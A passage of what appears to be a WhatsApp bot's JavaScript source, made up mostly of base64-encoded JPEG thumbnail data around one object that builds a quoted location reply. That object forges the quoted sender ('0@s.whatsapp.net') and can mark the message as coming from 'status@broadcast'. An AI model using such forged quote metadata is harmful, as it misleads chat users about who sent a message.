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"}}}
// REPLY WITH LOCATION
const floc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `Hello ${pushname}`, jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMTEhUQEhIVFRUXFRYWFxUVFRUVFRUVGBUWFhUVFRUYHSggGBolHRcVITEhJSkrLi4uFx8zODMsNygtLisBCgoKDg0OGhAQGi0lHyUtLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLf/AABEIAL0BCwMBEQACEQEDEQH/xAAcAAABBQEBAQAAAAAAAAAAAAADAQIEBQYABwj/xABAEAABAgIGBQkGBAcBAQEAAAABAAIDEQQFEiExUQZBYXGREyIygaGxssHwIzNCcnPRUmKC4QcUJJKzwvGig1P/xAAbAQACAwEBAQAAAAAAAAAAAAABAgADBAUGB//EADcRAAIBAgQDBgMHBQEBAQAAAAABAgMRBBIhMQVBURMiYXGBkTLR8AYUM6GxweEjQkNS8ZLSwv/aAAwDAQACEQMRAD8A2DWrrGAcDeoQHWp/p430ov8AjchzQSv0HPsH/VPgYjU3AjTsKrGCNShDMQYR5dK9K2krsK1K98S0SfQGoLztes6s3JnTpwUI2CMCqsWBmhSwB4UIFAQIOCgRQoQeEQC2J3TlmRj1LTh6HaO72K51MuwsOhQx8M98yt0cNSjtH9yl1ZvmHbR2fgb/AGhWZIrZC5n1H8i38I4BHKgXEMBuprQd32SunF8g5n1GCCd3XPy80joRYVUkgEabRMjhh+yonScS2M1LQiiKZz/4lLbaBaVAERkusHIq+hVdKakiitSVSNjDVpiRrBkRkRivWYd3jdbHnaqs7MgTWoqFY6RBSyWhE9Te1HEnDC89iY2mdOi7xJ8QqmKLWRnFWpFbGhEgRhSSChpiJcobmXETNb7Ch4R4pWQHWp/p430on+NyHNBK7QW+A/6p8DEam5EadirCGaUoQrSgwgqW+Qln3DHyWHH1MtPL1NGHheV+hEo+E87+rAdy4cdToMksCewA7ApYA9mfqSAQgQIOUCOCBBU8IOclFCydlcOwSuXahBQjlRibbdwjUxB4QIKFCHBwzUIcoQRwRAV1Jo0rxhll+yoqUuaL6dXlI6jP1KixayorqoxEfyguJF+8XT4S4Ls4DGuEOzfLY5WMwylLOuZTjR985LpvHRsYPu7uWMDRwXTWaeOb2LY4YvaNAsAALBKTk7s0xjZWCPCCCwYYmzAsRqRSWNxKshCUthJNIr6VXbAOar4YSUnqVSrJbFWa9K1fckU9uDJu3qg2EmCErIMrY/08b6UT/G5Kt0ErtBPcP+qfAxNU3AjUMKqGCMKDCGaUAkOnPx2CXWf+hcLiM7za6I6GFjaNxYTZeslkSsX3DsGr1vRAGChAjTf69ZJeYQgQIOUCcECDmu19Xr1qWmhWjSu7XZVOLl5D5nPgnljKj20FVGInWeJSOtUfMbs49BQFFUn1fuHJHoO48U8ZzbsmK4xWth7YTtg9ZLVTpSi7tlUppq1iQtBWAdSBb5PXZtdsk1na4javYc4KBK+Kyw7ZiN2sLNUhZmqnPMrMkPw7UKbtJMFSOaLQFkQLflOamEEUKZRrobFjACaiVyORR1rXNnorbQwubczVK1tiqFdRCLlreEgtyjtpMrqREiON81phGEVoUycmMFFeb5FN2kFzBlkd/Ku/CVO0j1DlZOvXKOiSoT0GEHW5/p430on+NyC3RCu0Gd7B/wBU+CGjU3IjUNVYwRpQCFaUpCJFvP6u43dwXnMQ81ST8TqUlaCDMSDh4WfqShAre7/p8kCBIbZb0EghAgQ7b6yCUIqhB4CIBSUSChMAUJkQcmQrCNh2m2XCYOo6xtXUpuWVX3Mskr6AqNQmw52XOA/CTNvdMKyUm9xFFLYcaM3lDE12QN15v68OpTM7WJlV7jDSA6Yabx0heHDqN6WakldEg4t6iRec3aL/APnrWhdTiOrwkMgOmAszNLI0QSJE/WpdGlLNFHMrRyzZGpFJDROavhBydiiUklcoabXhJkMF0KeDS3M067KsvMR0lqsqaKbuTNRVFUgCZC5GIxLb0NtKloWxqyGcWhZlXmuZf2UQzKGwCUgldSTHUIo7+VZkFO0kTLEwkKJqXQsUkuEEAgq3P9PG+jE8DkOaIV2gp9g/6p8DEam5EaphVQQoQCEalYSKwrzLd22dZKyQZuSISQxEAWGlCFCDIOCUIqARRju7/UkCD1ADWOnfq1bdqidyWHp0QUJkAVOgCtMsDL1kro1ZR5iOCYaHEncce9bKdRTRRKLiDhwSIj3k3ENAGUpz7+0q2+liu2tzorhiLJOdxISyk0rhSTdgSz523dGhU1azAUU3ubkVJO+o9tCk0qe5lh7TcZtPYW9hPBdfhWWWaL8zl8RTjlkvIzcSluNxK7UaUUcpzbBwYJcbk0pqIEmzRVJU99pwXMxOKurI10aPNmnY2S5b1NqVhxeikS4J0dPkFcgVvajlFzGGhHWt7FJUOIlaCDrZ39PG+lE/xuQW5Cv0Fd7B/wBU+BiM9yI1EIqthDtKUI+dx3JKjtFsaOrAsXmUdYNDTIhI1dnFRgDtUZB4SsI4JAizQCKzBAhHpcWZEJpvdjsbrVc5XeVDxWmZkpolcFaIKmQDobwbxgincjQ+adCnNTohyeMmndAaurMQxJ46uCtlVlISNNIQpUOIiiADdE3t7QrORCBpJBtQHflLXDqMj2OW/h1TLXXjoYsfDNRfhqZCHRyTcvRSqWOEo3NPVNVSEyFysRibuyNtKlpqXkNkgsW7NKVhpemUQNjIrrk0UK2RCVdYqFBUsS5imPWgckQnIBG1q72Eb6UTwOQW5CFoN7h/1T4GI1NyI07CqhgzSgQc51x3SVGJdqUvJllL415iNK84jqB4YRIGa68DZPyHnwUvrYnIkNUZBxOG/wAikYR4QCc46vWaVkGx41kTlM4AaydQSSlYKV2BodHIJe4zecdk75DsU7Jwfe3e40p30WwVse06y3AdJ238IUUm3psBqy1OizfcLm4F2t2xuzarMkpRvsv18gJpeYcSAyAHAJloKI594bnjuGP2601+RLBU6FGPd8IxPYNZVkU5OyIKWgXDIeatqaNJAQNjr3bx3BIgsemQAMYc9h2kcWk+SsjsyHUmDaa5n4mubxb+yelPJNS6MScc0XEpqHVwaQV2qldyRxIU7MvYcpLDzNSEfETpEbI7nKxIrbGkoi3EDUWyJBBBS5hsp5+wraAkw3IEGVmfYRvpRPA5DmEhaDu9i/6p8DFJ7kNSxyrGQUFKQdq4d6zYv8GXkWUfjQoXnUdQkMTEFoJtAv8AxG75RcPM9arpvNeXX9BpaaExqZsUdlv8ikbCh6VsI1zr+rvP7dqCTewQkCDfbdjK78o19Z18N+6hRy9+W/6CylyQlguxuGLjgflB8/QphSdaTk9vrQmbKPgsa64FpAustIIAGq5aVQTd5ei5IVyY0tDSZTkLpFziBuBN2oSGSz4ifeyrkGKBxIZJBcObiGjGYPxDhIJXRlZZuey+Y2ZcgswJuO7fsCMrJ2+rirURrjicTc1o++e3Yik725kdiRChSxvJxPkNi3U4ZEK3ca83n1qVNV3lYiAgSc79PhvUno7B5D5qIAyIL2/N/q5OmQIjcBnaXWgY5zNbSRwK79HD54KXVHBrVVCco+JGNemSuWDVyr7yzqNXJnzlJ4TTQkcR1Jbq6aqlhZFn3hEmg1g15VdWjKA8KqkTHPAvmqkmyxtEJ9aAGU1csOyp1kYtivLQrHSUZBKxd7CL9KJ4HJQkPQo+xf8AVPgYpIhp2PSBDNKUISd3DvWXGfgy8i2j+IhYZvOwAdZvPkvNJ6nUew+kEkWBi67cPiPl1hCo21lXMaGjuybBaAABqAA6gnWishXqwwQZBIr5Cf5mji4DzVc5WVxkrhkGyEatYtijx4utkKK8b2wiR2zXQwkE4pvqV1HoeSaYwDQo1GhQXxeWhwYcSM90aK9r4xlI2HOLRItnICXPGS71DDxrQlm22ObOo4tWMzArSlwyXsplIZKbj/URADnMF0nHirpYOGyFVZnoNS6YUuF7OtaMXQ2RGwnUqxZiQXOY17RFDBrD2kEWcfiK51WilsaqdZo9IoDpnEObZa5jgbQcDME2tZw47Vz6VHK80tzVKSa0JUQZYm4bBrPrNNNNarfl4CoaYct+rYNcvuq+z7NWWsmG9wzGS3+rgrqVJQXiK3ccrSAC4TmSAJ4kywwWeMc02+gzdkRosUc9wIIJABF46LRjvSVH32NHVIMggCJkQcCmAZWuqCTFe4C4kHsC9Hga67GKZ57HUn20miofDIxXRUrmF6CBk1GwFjCqybZlZpYi0rGhUtCG5jmG5XJqa1KneLFdTHm6aKpRRO0kwJJT2QtyI0rCdYIxBkErH3MX6UTwOQCQtD/cu+ofCxSRDTMKrCHY5BhCg+Xes2L/AAZeRZS+NDqKZzObj2Gz5Ly0HdXOsyRCF8/UtXmUy6kJTdSLYAoKRsIGsPdu3T4EFU1n3GWU/iRIhRLTQ7MA8VFK6uBqzCmCHw3MODg9p3GbV18LpTTKZ66Hln8SKA99ZRCGk2mwy2V8xybG3dbXcF6fA27FepyK+kzGx6pfCLxEaZkkyI+HUNuSvhTtd3K81z1zQmpXxati/wAwS91KLnFz+cS3k2QobjPH3YcNllcfFOKqWXI2Uk3G75moqih8lDEO+yL22jNwBHQcfiLcLWJAE5mZOFu5qSsTlAnSUstyCokGRYoGM55AEngAT1qEBwmN/DfrJbI9t6WMcqsHci0ptx+dva8DuBWae8mWR5BHvkCcgSkTIOTIAqdMhFpMpmfq5dHCt5Dl4tJT9Cjp0BpvXUpTkjmVIoroIActUruJnjZMuxSW2Vh7N3NmdWKmlxgVspwaM05pkGS0FNxZKEKsOWM7BIglKyHVi72MX6UTwOQCQ9D/AHLvqHwsUkQ0cJyRhJMMpWEI58gTkJ8FlxjtQm/BltFXqR8wlHbJoadQE/PtmvLR0SR1nqyXCTpgDMdfLIT4m7uKVvWwbBglbIDpnu3/ACu7lTUfdY8PiQ6hNkxg/KDxE++aZwcIx8UmSTvJk+jdHrPiK62F/CRRLcqq+q174jIrG2pMdDcJgGRc1zSJ5SdtvFxvXWwmIjBOMjDiaLnrEoIejRpUcCKx7IUPpl4LC8znYZORI/MO+S21cZGEO602/q5npUJN6o3znAAMaAGgAAASEhcABqC40pXOhGNhqUc5EByhCDXlasosB9IiTLWjAStOJuDWzIvJTwg5yyoWclFXZ41W2m9Ojuc4RTR2SMocEkHYHRQLTjq1DIBdelgYpd76/Y588RJ7G2o9Rx6PR3UwVrHiljXRGlzzGo8VgE2iw5078Jh2sLLJxlLLkt+v16FizRWbMaVlKfyLHRWBkR3PLJzvlPqvsiWqeJXKxMVCLSfM6NJuW6JMRvNs7JcAsqY4QJ0AVMgFFXtJLX2R+EHtP2Xd4bTUqbb6nC4nNxqJLoVPLFdPIjmZ2BKsEuJMqWQbsSSIBJKXIOAUIUgmsp2Q8MoEOp59jF+m/wABSkIuiR9i76h8LFGE0UJKwklhShC4iWfcsPEJJYeXjoX4dXqIlN/deZOmHaZXnBS9gjKviWi9+ZAG4A/dU05ZrseatZE4JmIDpfu3/K7uKqqaxY8PiRNiskBsu6sPsuni6f8ATTXIri9QlFw6/sfNWYJ3pL1FnuSFrEOUAcoQ4IkFUAcoQxH8SKHEj8jAZZDW2oji64Wuiy8A/n4rqcOUVmk/IwY2b0Rh9G9EX0ikCj3hoJdFfrDQb78LRwG8YyK6FarGjTut+XmZacXUlY9lrCBDDGtIAgwg0hgwJZLkxLIENIGsgZX+flVy3bOrGlexRQYxixrTt5yDW3gblx51XUlfkdDJkiXO3Z2J0UscE6AOmmRDN6Qe9/QO8r0XC/wfU87xX8b0KyS6ZzTpKAEkoQ6ShBJKEFAUCUbVnOyFhFAh1P8Acxfpv8BSkRG0T9076h8LEGMaGGlISYaVhJMIa+HrsXB4nXzTVNct/M34WFlmfMkMC5RsI1Oj/AOv7LNWnyLqceZKqjon5vII0fhFqblgmbEGxhzTuPcl5oZFi4TuzXecVJWZSDonxDI/t5LJg04ZoPkwz11JS2lZyIDlCHIkFUIcoAq6ZVxjC1asPBe0GVptkPcG2mTE7pG4haKNd0vFFNWhGrvuGqSrhR4dgXuJm9+t5zOQ2fuUK9d1ZXYaVFU0VuklKMxCGAvO06h1eexcnHVGkoddTfh4ptvoVcCIQC0fFIE7MvWSxRZfJczUOWpGQ4J0AaH86z+WfbJWJd24ubWxn6896dzR2T816LhmlBebPPcT1r+iK+S6BzhJIkEkoA6SlyC2ChcNmLZ2KXJYzoKpOyHYECHU4eyifTf4ClYSNoqZQnfUPhYgwmhhNSshJY2ZksuKxCo03Lny8y2lTc5WJjBwHevKybbuzqpWB0ulhgkDzvCMyqZ1LaLcthC+plqXpC1pkxtv8xMm9V03dnWqMvUvXgabRGmOiwC9waDyjhzQQJANliTmrIWS0Kqi1LxFsrRz8DuPclXxIJYr0FyobZk4OzEj5Hy61XltPMvJ/sTwCgq0UciA5QhygBUSHKAA0WkB4Lm4TIBzA1jYoNawSI8AFxwAJO4KLUBnK/YfZk4kOnvmCe8rDxONpR8izASvnK+jjnDeO9YI7m2WxqStaMZyYANrOeXfll2z81qelFeZnX4z8iDWFHDiT6yXWwUnGmkcrGwzVGyljQpFdSMrnLlGzByTXEHQoJcZBLKWVXGjHM7FzQ6p/EsNTE9DbTw3UmGrmylJU9uy/sIgTVYTfeGJ93R5wFvLiRCKUJ1M91E+m/wlBkQHRdvsnfOfC1BhL6GUoSdRxIT1nsHr1cvMY+u6lVp7LRHTw8FGF+oSOSGOIukOu7u71zptqLsaYpX1MhpBGIY1oPSJntAld29iyx6mpmfiQ3SnqzHnkrYuPqPBLmb7+Hjv6Z+yK7wMKaTKsQu8aiE6bQcwDxCrvdFLVh0TAyyPcgt0SwarKc2NDERu5w/C7WPWohehK5RcXZkwKCiogFmiQWagDkQCgqEA0yAXtsWrIPSkJkt1jZNEi0Y+BCDGhrcAoFu7uwNMPRbm6Z3Nv77I61bSV5FNZ2iVleNmxpyd3g/YLJxSF4J9GTh8rVGvArKK3nN+ZveFyIbnUlszSLWjGcnRAEGOC6yNU+9dCtTcaETDQqKVeaKuPTZ4Lr0aGWKT6HHr180m/EgxDNao6GRu4yymuAn1TB581mxE+7Y0YeHeNIAualc6qRGj0iVyuhSuBuwH+ZKfskLmPMgFuFDtQILSx7KJ8j/CUGFANGvdu+c+FqVhLxiBCfQTiNY7tnrWvOcSoZKuf/Y6WGnmhboSKV7t/wAjvCVyqnws1R3RmaTQhGAhzkZiRlOR19UprHGVrmqWmpWfy74LrERsjqOLXbWnWlnqroaDuazRRjRDihglM2jLCZbKctXRCalNyi0xa6s0XlBdOG3dLhcmi+6UzXeZIkpcBkqgrMwXzN7DIOGzURtH3Xoky+rTzLTc3kN4IDgZgiYIwIOBRMQ5QAqhBhtTuIIyMwRtDvKXWmuCw9p2KEEES+V/Ay4ykiAfNQlhC6V5MkSEIPtEv1G4A5Z7CftktlKGVGKtPM9Csp8UkFvrFLj6KlhpPpr7GfCVnHFRXoR6E3nt+Yd683BanopvRl+tRkEJlfleniruwG7K5T0B0rbvyHiSJdq72MhmVOHijg4OeV1KngQwxdC9jn2HmjnJJ2iC6bJdEq+d5VNSvyRfSoX1ZZwILW4LLJykbI01EfFjSRhAsvYgRHTK1JWEuIFNAHnzSrwhoSVkOpY9m/5H+EoBRH0d92fnPhaowl3DKUgQ0ixJwz45jh5Lj8Yq040ssn3r6L65G3BQlKd1sWVKiAwnOBuLbuu4d687N3g2dGC71ioq9s4jdlo/+HDzWN7M0T2LuJRWvbZe0OB1Hv37UiT5FdxKnq1sFzrJNlwFxvlInA5X6+Ksp6NhqTckrkurOhLIkdyMXoCpvcmBRiGEFGIJkZ34YH7HsWqlxdfDVj6r5f8ATo9m7XRdVBXBhHkokww4THQOsjNucvuurSr06qvCSZjrUb6rc17XTvGBvB2K0yDpokOmoAVFEORIDjR2txN5wGJO4eaaMXJ6Cyko6sgUyK5wvubqb5uOvcLt90tlKio6vcx1K2bRBYRuVpQV1JbeVbOOalKPVMw5stVS6NCUBvPbvPcV5KC1PVzehcLQjOMjDmkZiXFaMOr1I+ZTiHalLyK90GQIzl9/su05ZqkX0ucRLLSkutv3Eo8ATmVZOd9iqEEtyXaCpsy66D2hK5Ko6l62GlOEE8J0wMHYRuIKgLc85AktRYFacEAnUo+zf8jvCUGRAtH/AHZP5z4WoBZoKDRbV5N2zWVyuIY2VJ9nT369DVh6Kl3pEatYgL7Iwbd1m8+XBeUxFRynqdmjG0QAjOs2CeaDOW313qi7asW2V7llVcAg2nCRlIDXK4knaZC7VLbILKS2RXJ3LyEFZHYQK0XhFbkewCh3OiN2z7T+yRbsM9kyaERDMUir7E3h0xeSCL87iMeAWGSTbOhCteyaI9Nd7PbNsv7hPsmr+GJ/eY+v6MaZJqevuQEohnCx2szIzGzht9W2krsx1KGbWO5sKLSGRGiJDcHNImHNMwUU01dGRpp2YVEAKl0pkJhiRHhjRi5xkN207EG0ldkSbdkYysNOi94hUZkgSAYjxeRrss1bzwWKvjLRfZ+5sp4TnP2/kJV4cYrHuJLiTeTM9F2vdNc/hlWdTGwcm29f0DjVGOHkkjQUjor2p5wNCNyBAHJTcnzWRhlG8hKFDk8jK13yXmctpNHpr3gn5FgrEIOaJnt8vNasOu9czYp9yw2JRwVuU7HOcLifywR7Rg7NDH0UJlUYrpIHEbZVkZXI+6gbaQnyiqqheUQsTtDjEUsB1EAL09ih1DAQhmtBuDNQIMpXQf8AI/wlBhQGougfmPc1AjLxlYWGWGjnX3nDHEDNeM4hib152629tDtYaj/Ti30Kh9J5xa0gkdK+ZE8Lpz6z/wA5c7xipNPXY6EIqWhMq+O0Hni/U7UN41b+69VZ8ysgVKbWqLyGVWmUljActEJADlPc